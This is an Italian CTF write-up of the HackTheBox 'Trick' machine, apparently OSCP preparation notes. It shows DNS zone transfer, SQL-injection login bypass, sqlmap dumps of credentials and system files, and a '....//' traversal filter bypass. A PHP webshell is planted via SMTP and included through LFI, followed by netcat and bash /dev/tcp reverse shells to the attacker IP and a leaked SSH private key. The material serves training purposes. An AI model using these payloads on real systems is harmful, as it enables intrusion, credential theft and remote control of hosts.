**Target:10.10.11.166**

# INFORMATION GATHERING

Per prima cosa lanciamo un primo scan veloce per vedere quali porti sono aperti e quali servizi girano.

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -O --min-rate=5000 10.10.11.166
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-21 08:45 EDT
Nmap scan report for trick (10.10.11.166)
Host is up (0.041s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/21%OT=22%CT=1%CU=32098%PV=Y%DS=2%DC=I%G=Y%TM=64BA7E3
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11
OS:NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53
OS:CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.37 seconds
```

Un ulteriore scan su tutte le porte non ci fornisce nessuna nuova informazione.

Facciamo un piccolo recap, abbiamo 4 porte aprte:

- 22/tcp open  ssh     OpenSSH 7.9p1
- 25/tcp open  smtp    Postfix smtpd
- 53/tcp open  domain  ISC BIND 9.11.5-P4-5.1
- 80/tcp open  http    nginx 1.14.2


# ENUMERATION

## Port 53

Abbiamo la  [Port 53 DNS](Note/NETWORK%20SERVICES%20PENTESTING/Port%2053%20DNS.md), quando abbiamo questa porta aperta, è buona norma usare nslookup per interrogare il DNS

```
┌──(root㉿kali)-[/home/kali]
└─# nslookup
> server 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
;; communications error to 10.10.11.166#53: timed out
166.11.10.10.in-addr.arpa       name = trick.htb.
>
```

Abbiamo un nome di dominio, lo inseriamo nel nostro etc/hosts
eseguiamo anche un zone transfer

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# dig axfr  @10.10.11.166 trick.htb

; <<>> DiG 9.18.13-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 47 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Fri Jul 21 09:07:16 EDT 2023
;; XFR size: 6 records (messages 1, bytes 231)
```

Vediamo un secondo dominio preprod-payroll.trick.htb. aggiungiamo anche questo al nostro /etc/hosts

## Port 80

Vistiamo la pagina trick.htb

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick.png)
Ci troviamo di fronte ad un sito in costruzione.

Proviamo ad enumerare con gobuster per vedere se abbiamo directory esposte.

```
┌──(kali㉿kali)-[~/htb/trick]
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u trick.htb -r 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://trick.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2022/09/26 05:15:53 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 403) [Size: 169]
/css                  (Status: 403) [Size: 169]
/js                   (Status: 403) [Size: 169]
Progress: 4515 / 220561 (2.05%)               ^Z
zsh: suspended  gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
```

Non abbiamo nulla di utile, neanche il codice sorgente della pagina ci da informazioni utili 
passiamo all'altro nome di dominio preprod-payroll.trick.htb.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick2.png)

ci troviamo di fronte ad un prompt di login, Nonostante l'aspetto della pagina, questo è in realtà un vero software. Cercardo su Google l'intera stringa tra virgolette restituisce un gruppo di pagine reali con lo stesso titolo:

`Payroll Management System`

Questo è un software chiamato "Payroll Management System" di Sourcecodetester.

Proviamo a vedere a vedere se abbiamo qualche vulnerabilità nota.

### SQL Injection

Troviamo questa  [SQL bypass authentication](https://www.exploit-db.com/exploits/50403)
L' SQL ci dici di usare questo payload `'OR 1 = 1` 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick3.png)

Siamo dentro, enumerando un po il sito riusciamo ad trovare un password.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick4.webp)

### SQL injection Manual

Oltre a un semplice bypass di autenticazione, cercherò di recuperare le informazioni utilizzando l'iniezione SQL. Troverò una richiesta nella cronologia di Burp in cui ho provato ad accedere con qualcosa come "admin" / "admin", fare clic con il tasto destro su quella richiesta e selezionare "Invia a ripetitore".

Il miglior tipo di SQLI è quando qualcosa dal DB viene restituito alla pagina. Sfortunatamente, non ce l'ho qui. Ma posso verificare la presenza di un'iniezione booleana. Aggiornerò il mio nome utente con qualcosa che contiene un true e vedrò che il risultato è "1":
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick5.png)
Quando imposto che 1=1 su qualcosa di falso, il risultato è diverso:
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick6.png)
Ciò significa che posso inserire query più complicate al posto di 1=1 e ottenere risposte sì/no.

### Identify Injection in sqlmap

In realtà ottenere dati da un'iniezione booleana cieca richiede molta forzatura bruta e sqlmap è lo strumento per farlo. Troverò una richiesta nella cronologia di Burp in cui ho provato ad accedere con qualcosa come "admin" / "admin", e la salviamola come login.req.

L'esecuzione di sqlmap con questa richiesta trova solo un'iniezione basata sul tempo:

```┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap  -r login.req --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.6#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:00:08 /2023-07-21/

[10:00:08] [INFO] parsing HTTP request from 'login.req'
[10:00:09] [INFO] resuming back-end DBMS 'mysql'
[10:00:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 8044 FROM (SELECT(SLEEP(5)))iJwa) AND 'gugB'='gugB&password=admin

    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 6546=(SELECT (CASE WHEN (6546=6546) THEN 6546 ELSE (SELECT 3418 UNION SELECT 2270) END))-- -&password=admin
---
[10:00:09] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:00:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 10:00:09 /2023-07-21/
```

Il tempo è molto lento e so che ce n'è uno basato sul booleano. Specificherò la tecnica e salirò di livello di rilevazione di iniezione di SQL e la troverà:

```┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap  -r login.req --batch --technique B --level 5
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:02:34 /2023-07-21/

[10:02:34] [INFO] parsing HTTP request from 'login.req'
[10:02:34] [INFO] resuming back-end DBMS 'mysql'
[10:02:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 6546=(SELECT (CASE WHEN (6546=6546) THEN 6546 ELSE (SELECT 3418 UNION SELECT 2270) END))-- -&password=admin
---
[10:02:34] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:02:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 10:02:34 /2023-07-21/
```

### Enumerate with sqlmap

Ora che sqlmap ha trovato la vulnerabilità, posso assegnargli ulteriori informazioni. Ad esempio, i database 

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap  -r login.req --batch --technique B --threads 10 --dbs

...<snip>...
available databases [2]:
[*] information_schema
[*] payroll_db

[10:08:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 10:08:53 /2023-07-21/
```

e l'utente corrente del DB:

```┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap  -r login.req --batch --technique B --threads 10 --current-user
        __
...<snip>...
current user: 'remo@localhost'
[10:06:51] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 10:06:51 /2023-07-21/

```

Sto usando i thread per accelerare il processo. I thread sono sicuri con boolean, ma non basati sul tempo.

Esistono due database, sebbene uno sia quello predefinito per MySQL:

Enumeriamo le tabelle del database payroll_db

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap  -r login.req --batch --technique B --threads 10 -D payroll_db --tables

...<snip>...
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+

[10:11:27] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 10:11:27 /2023-07-21/
```

Abbiamo 11 tabelle, Scaricherò la tabella degli utenti:

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap  -r login.req --batch --technique B --threads 10 -D payroll_db -T users --dump

...<snip>...
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+--------+---------+---------+------------+-----------------------+
| id | doctor_id | name          | type   | address | contact | username   | password              |
+----+-----------+---------------+--------+---------+---------+------------+-----------------------+
| 1  | 0         | Administrator | 1      | <blank> | <blank> | Enemigosss | SuperGucciRainbowCake |
+----+-----------+---------------+--------+---------+---------+------------+-----------------------+

[10:13:30] [INFO] table 'payroll_db.users' dumped to CSV file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/users.csv'
[10:13:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 10:13:30 /2023-07-21/

```

abbiamo un  utente, con username Enemigosss, e password “SuperGucciRainbowCake”. Prenderò nota di entrambi.

### File Read with sqlmap

SQL può essere configurato in modo tale da poter leggere i file attraverso l'iniezione. sqlmap lo consente con il parametro --file-read. 

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap -r login.req --batch --threads 10 --file-read=/etc/passwd

...<snip>...
successfully downloaded from the back-end DBMS file system? [Y/n] Y
[10:17:47] [INFO] retrieving the length of query output
[10:17:47] [INFO] retrieved: 4
[10:17:48] [INFO] retrieved: 2351
[10:17:48] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)

[10:17:48] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
```

Leggerò il file /etc/passwd  Ci vogliono pochi minuti, ma lo scarica . Cercherò gli utenti che hanno un set di shell (rimuovendo gli account della macchina) e ne vedrò un paio:

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

### Find Marketing Subdomain

#### Via SQL Injection

Possiamo utilizzare la SQL injection `--file-read` per ottenere la configurazione NGINX.
So che è NGINX dall'enumerazione iniziale. Il file di configurazione predefinito sarebbe in /etc/nginx/sites-enabled/default. Estrarrò quel file con sqlmap 

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap -r login.req --batch --threads 10 --file-read=/etc/nginx/sites-enabled/default

...<snip>...
do you want confirmation that the remote file '/etc/nginx/sites-enabled/default' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[13:28:00] [INFO] retrieving the length of query output
[13:28:00] [INFO] retrieved: 4
[13:28:01] [INFO] retrieved: 1058
[13:28:01] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default' and the remote file '/etc/nginx/sites-enabled/default' have the same size (1058 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default (same file)

[13:28:01] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 13:28:01 /2023-07-21/
```


Il file ci  restituisce informazioni su tre host virtuali (vhost)
Il primo è per trick.htb, ed è il server predefinito, motivo per cui la visita tramite IP porta anche lì:

```bash
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# cat _etc_nginx_sites-enabled_default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

```

Tra loro ce n'è uno nuovo, preprod-marketing.trick.htb:
```
server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}
```

Il terzo è preprod-payroll.trick.htb, il dominio che già conosciamo 
```
server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

il file ci  restituisce informazioni su tre host virtuali (vhost)
lo aggiungiamo al nostro /etc/hosts

#### Via Fuzzing

Data l'interessante struttura di preprod-payroll.trick.htb, potrei voler controllare altri sottodomini  per preprod-. Eseguirò enumerazione di ulteriori vhost (sottodomini ) con wfuzz 

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# wfuzz -u http://10.10.11.166 -H "Host: preprod-FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 5480
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.166/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000254:   200        178 L    631 W      9660 Ch     "marketing"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Di seguito una spiegazione dei parametri utilizzati nel comando:

- `-u http://10.10.11.166`: Specifica l'URL del sito web target da testare.
- `-H "Host: preprod-FUZZ.trick.htb"`: Imposta l'intestazione dell'host per il fuzzing. "FUZZ" è un segnaposto che verrà sostituito con i sottodomini dell'elenco durante l'attacco.
- `-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`: Specifica il percorso dell'elenco di parole contenente i sottodomini da utilizzare durante l'attacco.
- `--hh 5480`: Opzione per filtrare le risposte con dimensione dell'intestazione pari a 5480 byte. Questo è utile per identificare risposte diverse da quelle di default, che potrebbero indicare che il sottodominio è valido.

L'utilizzo di wfuzz con il parametro `--hh` è finalizzato a identificare potenziali sottodomini validi, poiché un sottodominio valido potrebbe restituire risposte diverse dalle altre, come ad esempio errori personalizzati o pagine con contenuti specifici.

ecco qui il nostro `preprod-marketing.trick.htb`
Aggiungiamo all fine etc/hosts 

### LFI come michael

Visitiamo il sottodominio, 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick7.png)

Ci sono alcune altre pagine ("Servizi", "Informazioni", "Contatti"), ma anche il loro contenuto è spazzatura. Tuttavia, lo schema dell'URL è interessante. Facendo clic sul collegamento "Servizi" si accede a http://preprod-marketing.trick.htb/index.php?page=contact.html. È comune sui siti PHP avere un index.php principale che gestisce il tema generale, le barre dei menu, ecc. e quindi include la pagina di destinazione al suo interno.

Visitando http://preprod-marketing.trick.htb/contact.html viene caricata la stessa pagina, suggerendo che la pagina HTML statica si trova nella stessa directory e viene caricata dal parametro page.

### Directory Traversal [Fail]

Un modo per attaccare questo tipo di inclusione è cercare una vulnerabilità di  directory traversal . Il tentativo di caricare un file al di fuori della directory web (/etc/passwd è un file comune da usare, poiché è leggibile da tutti e sempre nello stesso posto) fallisce utilizzando sia un percorso assoluto (http://preprod-marketing.trick.htb/index.php?page=/etc/passwd) che relativo (http://preprod-marketing.trick.htb/index.php?page=../../../../../../../. ./../etc/passwd). Entrambi restituiscono solo una pagina vuota.

Il sito deve filtrare l'input in qualche modo.

A questo punto tornerò alla SQL injection. Ho il percorso completo del sito dalla configurazione di NGINX. Lo leggerò con sqlmap e --file-read=/var/www/market/index.php.

```bash
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# sqlmap -r login.req --batch --threads 10 --file-read=/var/www/market/index.php
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:47:52 /2023-07-25/

[01:47:52] [INFO] parsing HTTP request from 'login.req'
[01:47:53] [INFO] resuming back-end DBMS 'mysql'
[01:47:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 8044 FROM (SELECT(SLEEP(5)))iJwa) AND 'gugB'='gugB&password=admin

    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=admin' AND 6546=(SELECT (CASE WHEN (6546=6546) THEN 6546 ELSE (SELECT 3418 UNION SELECT 2270) END))-- -&password=admin
---
[01:47:53] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:47:53] [INFO] fingerprinting the back-end DBMS operating system
[01:47:53] [INFO] the back-end DBMS operating system is Linux
[01:47:53] [INFO] fetching file: '/var/www/market/index.php'
[01:47:53] [INFO] retrieving the length of query output
[01:47:53] [INFO] retrieved: 388
[01:48:17] [INFO] retrieved: 3C3F7068700D0A2466696C65203D20245F4745545B2770616765275D3B0D0A0D0A696628216973736574282466696C6529207C7C20282466696C653D3D22696E6465782E706870222929207B0D0A202020696E636C75646528222F7661722F7777772F6D61726B65742F686F6D652E68746D6C22293B0D0A7D0D0A656C73657B0D0A09696E636C75646528222F7661722F7777772F6D61726B65742F222E7374725F7265706C61636528222E2E2F222C22222C2466696C6529293B0D0A7D0D0A3F3E
do you want confirmation that the remote file '/var/www/market/index.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[01:48:17] [INFO] retrieving the length of query output
[01:48:17] [INFO] retrieved: 3
[01:48:18] [INFO] retrieved: 194
[01:48:18] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php' and the remote file '/var/www/market/index.php' have the same size (194 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php (same file)

[01:48:18] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

[*] ending @ 01:48:18 /2023-07-25/
```


Leggiamo il file 

```
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# cat _var_www_market_index.php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
?>                                                                          

```

Ora posso spiegare perché tutti i tentativi precedenti sono falliti.

L'attraversamento della directory con un percorso assoluto non è riuscito perché l'input è stato preceduto da /var/www/market/, rendendolo /var/www/market//etc/passwd, che non esiste.
L'attraversamento della directory con un percorso relativo non è riuscito a causa della chiamata str_replace, che ha rimosso tutti i ../, lasciando /var/ww/market/etc/passwd.


### Directory Traversal

Questo tipo di str_replace per rimuovere ../ è un modo comune e non sicuro per cercare di prevenire inclusioni di file locali / vulnerabilità di directory traversal . Il problema è che str_replace ne applica solo uno. Ciò significa che se metto un mucchio di ....// nella stringa, quando rimuove ../, rimane ../. Per esempio:

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick8.png)


## Shell via mail include

Guardando indietro al nostro Nmap iniziale possiamo vedere che c'è un server SMTP sulla porta 25. Linux ha una directory /var/mail/ per consentire agli utenti di ricevere messaggi. Se possiamo inviare una mail con codice PHP a michael , che è un utente della macchina in quanto risulta sul file /etc/passwd, apparirà in /var/mail/michael . Per connetterci e inviare la nostra posta dannosa useremo netcat . 

```bash
┌──(root㉿kali)-[/home/kali/htb/trick]
└─# nc trick.htb 25
220 debian.localdomain ESMTP Postfix (Debian/GNU)
EHLO xrabbit
250-debian.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
MAIL FROM: xRabbit
250 2.1.0 Ok
RCPT TO: michael
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_REQUEST['cmd']); ?>
.
250 2.0.0 Ok: queued as AC9F04099C
```

nei comandi usati sopra, inviamo un'e-mail al server di posta in ascolto sulla porta 25.
helo x è un comando per aprire/"salutare" il server, mail from: dà al server il nome del mittente,
mentre rcpt to: fornisce il nome del destinatario. data notifica al server che i seguenti dati saranno il messaggio principale della posta e il server termina i dati con <CR><LF>.<CR><LF> , che è un . tra due nuove linee. Diamo la nostra shell PHP come dati e terminiamo con un punto.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/trick9.png)

Funziona, abbiamo la nostra RCE

non ci resta che metterci in ascolto con nc 

```
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 1234
listening on [any] 1234 ...

```
e visitare l'url 

http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=nc%2010.10.14.18%201234%20-e%20%2Fbin%2Fsh

`nc%2010.10.14.18%201234%20-e%20%2Fbin%2Fsh` corrisponde al url encoded di 
nc 10.10.14.18 1234 -e /bin/sh

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.18] from trick.htb [10.10.11.166] 46744
id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

abbiamo la nostra shell

> Nota: Possiamo utilizzare anche un shell in bash come questa:
> bash -c 'bash -i >& /dev/tcp/ip-attacker/1234 0>&1' basta che ci ricoriamo di effettuare l'url encode 


## SSH via LFI

Proviamo a leggere la chiave RSA di micheal con LFI

http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././..././..././home/michael/.ssh/id_rsa

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Trick10.png)

non ci resta che salvare in un file di testo 

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
